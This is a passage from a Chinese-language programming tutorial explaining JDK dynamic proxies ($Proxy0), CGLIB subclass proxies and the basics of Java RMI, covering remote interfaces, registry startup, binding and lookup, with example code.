&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UndeclaredThrowableException</span>(ex);  <span class="comment">// 处理其他异常</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 静态代码块，用于初始化 Method 对象，反射获取目标方法</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取 Object 类的 equals 方法</span></span><br><span class="line">            equalsMethod = Class.forName(<span class="string">&quot;java.lang.Object&quot;</span>).getMethod(<span class="string">&quot;equals&quot;</span>, Class.forName(<span class="string">&quot;java.lang.Object&quot;</span>));</span><br><span class="line">            <span class="comment">// 获取 Object 类的 toString 方法</span></span><br><span class="line">            toStringMethod = Class.forName(<span class="string">&quot;java.lang.Object&quot;</span>).getMethod(<span class="string">&quot;toString&quot;</span>);</span><br><span class="line">            <span class="comment">// 获取 Object 类的 hashCode 方法</span></span><br><span class="line">            hashCodeMethod = Class.forName(<span class="string">&quot;java.lang.Object&quot;</span>).getMethod(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">            <span class="comment">// 获取 Service 接口的 perform 方法</span></span><br><span class="line">            performMethod = Class.forName(<span class="string">&quot;com.example.Service&quot;</span>).getMethod(<span class="string">&quot;perform&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchMethodError</span>(((Throwable) ex).getMessage());  <span class="comment">// 如果方法不存在，抛出 NoSuchMethodError</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoClassDefFoundError</span>(((Throwable) ex).getMessage());  <span class="comment">// 如果类不存在，抛出 NoClassDefFoundError</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>$Proxy0</code> 的构造函数在 <code>Proxy.newProxyInstance</code> 创建动态代理类时调用。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 构造函数，接收 InvocationHandler 作为参数</span></span><br><span class="line"><span class="keyword">public</span> $Proxy0(InvocationHandler handler) <span class="keyword">throws</span>  &#123;</span><br><span class="line">    <span class="built_in">super</span>(handler);  <span class="comment">// 将 handler 传递给 Proxy 类的构造函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>构造函数传入我们实现的 <code>InvocationHandler</code> 接口，该实现类直接传递给父类也就是 <code>Proxy</code> 的构造函数。在 <code>Proxy</code> 的构造函数将其保存在成员变量 <code>h</code> 中。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 通过指定的调用处理器（通常是动态代理类的一个实例）构造一个新的 &#123;<span class="doctag">@code</span> Proxy&#125; 实例。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> h 该代理实例的调用处理器</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> NullPointerException 如果传入的调用处理器 &#123;<span class="doctag">@code</span> h&#125; 为 &#123;<span class="doctag">@code</span> null&#125;，将抛出该异常。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">Proxy</span><span class="params">(InvocationHandler h)</span> &#123;</span><br><span class="line">    Objects.requireNonNull(h);  <span class="comment">// 检查传入的调用处理器是否为 null</span></span><br><span class="line">    <span class="built_in">this</span>.h = h;  <span class="comment">// 将调用处理器赋值给实例变量 h</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>另外 <code>$Proxy0</code> 根据我们传入的被代理类的接口动态生成了对应的方法的代理，另外还生成了一些 <code>Object</code> 的方法的代理例如 <code>equals</code>，<code>toString</code> 等。</p>
<p>以被代理接口的 <code>perform</code> 方法为例，在 <code>$Proxy0</code> 的静态代码块中会通过反射获取被代理接口的 <code>perform</code> 方法。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">performMethod = Class.forName(<span class="string">&quot;com.example.Service&quot;</span>).getMethod(<span class="string">&quot;perform&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>而在 <code>perform</code> 方法的实现中，<code>$Proxy0</code> 会调用前面保存的 <code>InvocationHandler</code> 的实现类 <code>h</code> 的 <code>invoke</code> 方法，并依次将代理类对象 <code>$Proxy0</code>，<code>perform</code> 方法的 <code>Method</code> 对象，调用 <code>perform</code> 方法时传入的参数依次作为参数传递给 <code>invoke</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 重写 perform 方法（来自 Service 接口）</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">perform</span><span class="params">()</span> <span class="keyword">throws</span>  &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 使用 InvocationHandler 调用目标类的 perform 方法</span></span><br><span class="line">        <span class="built_in">super</span>.h.invoke(<span class="built_in">this</span>, performMethod, (Object[]) <span class="literal">null</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException | Error ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> ex;  <span class="comment">// 重新抛出 RuntimeException 或 Error</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UndeclaredThrowableException</span>(ex);  <span class="comment">// 处理其他异常</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="基于类的动态代理（CGLIB）"><a href="#基于类的动态代理（CGLIB）" class="headerlink" title="基于类的动态代理（CGLIB）"></a>基于类的动态代理（CGLIB）</h3><p><strong>CGLIB</strong>（Code Generation Library）是一个功能强大的字节码生成和修改库，广泛用于 Java 中动态生成代理类。它可以在运行时动态地创建一个子类并对其进行增强（如添加代理方法、拦截器等），常常用于 AOP（面向切面编程）或其他需要动态代理的场景。</p>
<p>CGLIB 通过动态生成子类来实现代理功能。它不像 JDK 动态代理那样要求目标类实现接口，而是通过继承目标类来生成代理类。</p>
<p>另外 CGLIB 是基于字节码操作在运行时动态生成代理类，因此相比于传统的反射机制，它的性能更高。</p>
<p>CGLIB 动态代理的应用过程如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> net.sf.cglib.proxy.Enhancer;</span><br><span class="line"><span class="keyword">import</span> net.sf.cglib.proxy.MethodInterceptor;</span><br><span class="line"><span class="keyword">import</span> net.sf.cglib.proxy.MethodProxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Service</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doSomething</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Service is doing something.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CGLibExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建 Enhancer 对象</span></span><br><span class="line">        <span class="type">Enhancer</span> <span class="variable">enhancer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Enhancer</span>();</span><br><span class="line">        <span class="comment">// 设置目标类</span></span><br><span class="line">        enhancer.setSuperclass(Service.class);</span><br><span class="line">        <span class="comment">// 设置回调函数（拦截器）</span></span><br><span class="line">        enhancer.setCallback(<span class="keyword">new</span> <span class="title class_">MethodInterceptor</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> Object <span class="title function_">intercept</span><span class="params">(Object obj, java.lang.reflect.Method method, Object[] args,</span></span><br><span class="line"><span class="params">                                    MethodProxy proxy)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;Before method call&quot;</span>);</span><br><span class="line">                <span class="comment">// 调用目标类的方法</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> proxy.invokeSuper(obj, args);</span><br><span class="line">                System.out.println(<span class="string">&quot;After method call&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> result;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建代理类实例</span></span><br><span class="line">        <span class="type">Service</span> <span class="variable">proxy</span> <span class="operator">=</span> (Service) enhancer.create();</span><br><span class="line">        <span class="comment">// 调用代理类方法</span></span><br><span class="line">        proxy.doSomething();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们需要在 Maven 中引入 cglib：</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>cglib<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>cglib<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>另外如果想看 CGLIB 动态生成的代理类的实现可以添加如下设置：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.setProperty(DebuggingClassWriter.DEBUG_LOCATION_PROPERTY, <span class="string">&quot;output/&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<h1 id="远程过程调用"><a href="#远程过程调用" class="headerlink" title="远程过程调用"></a>远程过程调用</h1><p><strong>RPC</strong>（Remote Procedure Call，远程过程调用）一种允许不同计算机上的程序之间通过网络进行通信并调用彼此的方法的技术。通过RPC，程序可以像调用本地函数一样调用远程的函数，隐藏了通信和网络的复杂性，使得分布式应用程序的开发变得更加简单。</p>
<p>RPC的核心思想是：在分布式系统中，客户端通过调用远程服务器上的方法，获取远程服务的结果，而无需关注底层的网络通信和序列化等细节。RPC框架负责将函数调用转换为网络请求，并处理请求的序列化、传输、反序列化等过程。</p>
<h2 id="RMI（Remote-Method-Invocation）"><a href="#RMI（Remote-Method-Invocation）" class="headerlink" title="RMI（Remote Method Invocation）"></a>RMI（Remote Method Invocation）</h2><p>Java RMI（远程方法调用）是 Java 平台提供的一种机制，它允许 Java 程序在不同的 JVM（Java虚拟机）上进行通信，并能够像调用本地对象一样调用远程对象的方法。RMI 是 Java  中分布式应用的基础技术之一，它封装了网络通信、序列化等复杂的底层实现，允许开发者专注于应用逻辑的实现。</p>
<p>Java RMI 允许客户端通过存根（Stub）对象，调用在远程 JVM 中的真实对象的方法。RMI 不仅支持<strong>方法调用的远程执行</strong>，还支持在<strong>不同机器之间传输对象</strong>。</p>
<h3 id="RMI的主要组件"><a href="#RMI的主要组件" class="headerlink" title="RMI的主要组件"></a>RMI的主要组件</h3><h4 id="远程接口（Remote-Interface）"><a href="#远程接口（Remote-Interface）" class="headerlink" title="远程接口（Remote Interface）"></a>远程接口（Remote Interface）</h4><p>远程接口定义了可以在远程调用中使用的方法，客户端和服务端都需定义用于远程调用的接口。远程接口必须满足下面两个要求：</p>
<ul>
<li>远程接口需要继承自 <code>java.rmi.Remote</code>。</li>
<li>远程接口的每个方法必须声明抛出 <code>java.rmi.RemoteException</code> 异常。</li>
</ul>
<p>下面是一个简单的远程接口示例：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Hello</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    String <span class="title function_">sayHello</span><span class="params">(Object s)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    String <span class="title function_">sayGoodBye</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="远程对象实现类（Remote-Object-Implementation）"><a href="#远程对象实现类（Remote-Object-Implementation）" class="headerlink" title="远程对象实现类（Remote Object Implementation）"></a>远程对象实现类（Remote Object Implementation）</h4><p>服务端的远程对象实现类需要实现远程接口，且<strong>需要继承 <code>java.rmi.server.UnicastRemoteObject</code> 类</strong> 。<code>UnicastRemoteObject</code> 类提供了将远程对象注册到 RMI 注册表的方法，方便自动将这个远程对象导出供客户端调用。下面是一个简单的远程对象实现类示例：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteHello</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">Hello</span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">RemoteHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(Object s)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;sayHello Called&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello &quot;</span> + s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayGoodBye</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;sayGoodbye Called&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Bye~&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>当然远程对象实现类也可以不继承 <code>UnicastRemoteObject</code>，但需要手动调用 <code>UnicastRemoteObject#exportObject</code> 来导出该远程对象，使其成为可被客户端调用的远程对象。导出对象时可以指定监听端口来接收 <code>incoming calls</code>，默认为随机端口。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteHello</span> <span class="keyword">implements</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RemoteHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="comment">// 手动导出对象</span></span><br><span class="line">        UnicastRemoteObject.exportObject(<span class="built_in">this</span>, <span class="number">1099</span>);  <span class="comment">// 可以指定端口</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(Object name)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;sayHello Called&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello, &quot;</span> + name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayGoodBye</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;sayGoodBye Called&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Bye~&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h4 id="存根（Stub）和骨架（Skeleton）"><a href="#存根（Stub）和骨架（Skeleton）" class="headerlink" title="存根（Stub）和骨架（Skeleton）"></a>存根（Stub）和骨架（Skeleton）</h4><p>为屏蔽网络通信的复杂性，RMI引入两个概念，客户端<strong>存根（Stub）</strong>和服务端<strong>骨架（Skeleton）</strong> 。</p>
<ul>
<li><strong>存根（Stub）</strong>： 存根是客户端访问远程对象的代理。当客户端调用远程方法时，存根将方法调用封装并通过网络发送到远程服务器。</li>
<li><strong>骨架（Skeleton）</strong>： 骨架是服务器端的组件，用于接收客户端请求，并将请求传递给真实的远程对象执行。在JDK 5.0之后，骨架不再被需要，因为JDK使用动态代理来处理远程调用。</li>
</ul>
<h4 id="RMI-注册表（RMI-Registry）"><a href="#RMI-注册表（RMI-Registry）" class="headerlink" title="RMI 注册表（RMI Registry）"></a>RMI 注册表（RMI Registry）</h4><p>RMI 注册表用于管理和查找远程对象，它监听一个端口（默认是 1099）并提供远程对象查找服务。</p>
<ul>
<li><strong>远程对象</strong>可以通过注册表进行<strong>查找</strong>和<strong>绑定</strong> 。</li>
<li><strong>客户端</strong>通过 RMI 注册表来查<strong>找远程对象</strong> 。</li>
</ul>
<h5 id="启动-RMI-注册表"><a href="#启动-RMI-注册表" class="headerlink" title="启动 RMI 注册表"></a>启动 RMI 注册表</h5><p>RMI 注册表主要有两种启动方式：</p>
<ul>
<li><p>通过 <code>rmiregistry</code> 命令启动（独立进程方式）</p>
</li>
<li><p>通过 <code>LocateRegistry.createRegistry()</code> 启动（程序内启动方式）</p>
</li>
</ul>
<p>通过 <code>rmiregistry</code> 命令启动 RMI 注册表是传统的启动方法，你需要在终端或命令行中运行 <code>rmiregistry</code> 命令手动启动一个独立的 RMI 注册表进程，它会监听一个端口（默认是 1099），并等待客户端进行连接和查找远程对象。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rmiregistry</span><br></pre></td></tr></table></figure></div>

<p>默认情况下，<code>rmiregistry</code> 会监听端口 1099。如果你希望 RMI 注册表监听一个不同的端口，可以指定端口号，例如：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rmiregistry 2000</span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content">
      <ul>
<li>需要确保在 <strong>启动服务端程序之前</strong> 启动 RMI 注册表。因为服务端会将远程对象注册到注册表中，注册表必须在此之前启动。</li>
<li>启动 <code>rmiregistry</code> 后，它会在终端持续运行并监听指定端口（默认是 1099）。在这个终端窗口中，你看不到任何提示，直到你停止它。</li>
<li>在使用 <code>rmiregistry</code> 时，通常建议将它放在单独的终端窗口或后台运行，以便它能够持续监听客户端的请求。</li>
</ul>

    </div>
  </div>

<p>另一种启动 RMI 注册表的方式是通过 <code>LocateRegistry.createRegistry()</code> 启动 RMI 注册表。这种方式通过 Java 代码在程序内部启动 RMI 注册表。<code>LocateRegistry.createRegistry()</code> 方法可以在代码中指定端口号，并启动一个嵌入式的 RMI 注册表。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 创建并启动 RMI 注册表，监听 1099 端口</span></span><br><span class="line">            LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;RMI registry is running.&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 你的远程对象实例化代码和绑定远程对象的代码</span></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content">
      <p><code>LocateRegistry.createRegistry()</code> 启动方式主要应用于开发和测试环境中。我们通常会直接把 RMI 启动部分放到服务端中，而不依赖外部的 <code>rmiregistry</code> 命令，这样可以简化调试和部署过程。</p>

    </div>
  </div>

<h5 id="服务端注册远程对象"><a href="#服务端注册远程对象" class="headerlink" title="服务端注册远程对象"></a>服务端注册远程对象</h5><p>远程对象需要在服务器端注册到 RMI 注册表中，这样客户端才能通过注册表查找到远程对象并进行方法调用。</p>
<p><code>java.rmi.Naming</code> 类提供了与 RMI 注册表的交互功能。这个类提供了几个静态方法，用来在 RMI 注册表中 <strong>查找</strong>、<strong>绑定</strong>、<strong>更新</strong> 或 <strong>解绑</strong> 远程对象：</p>
<ul>
<li><strong>查找远程对象</strong>： <code>lookup</code></li>
<li><strong>绑定远程对象</strong>： <code>bind</code>（对象已经存在会抛出异常）和 <code>rebind</code>（会覆盖已有对象）</li>
<li><strong>解除绑定远程对象</strong>： <code>unbind</code></li>
<li><strong>列出远程对象</strong>： <code>list</code></li>
</ul>
<p>在服务端代码中，远程对象注册通常是通过 <code>Naming.rebind()</code> 或 <code>Naming.bind()</code> 来实现的。这些方法将远程对象与一个名字绑定，从而让客户端可以使用该名字进行查找。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 创建并启动 RMI 注册表，监听 1099 端口</span></span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 创建远程对象实例</span></span><br><span class="line">        <span class="type">RemoteHello</span> <span class="variable">hello</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteHello</span>();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 将远程对象注册到 RMI 注册表，绑定名字 &quot;hello&quot;</span></span><br><span class="line">        Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1099/hello&quot;</span>, hello);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;RemoteHello object is registered.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在上面的示例中，<code>Naming.bind(&quot;rmi://127.0.0.1:1099/hello&quot;, hello)</code> 将 <code>hello</code> 远程对象注册到 RMI 注册表中，绑定的名字为 <code>&quot;hello&quot;</code>。客户端将通过这个名字来查找并调用远程对象的方法。</p>
<h5 id="客户端查找远程对象"><a href="#客户端查找远程对象" class="headerlink" title="客户端查找远程对象"></a>客户端查找远程对象</h5><p>客户端通过 RMI 注册表查找远程对象，方法是使用 <code>Naming.lookup()</code>。这时，客户端将通过给定的名字从 RMI 注册表中查找远程对象，并通过返回的存根（stub）对象调用远程方法。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="type">Hello</span> <span class="variable">hello</span> <span class="operator">=</span> (Hello) 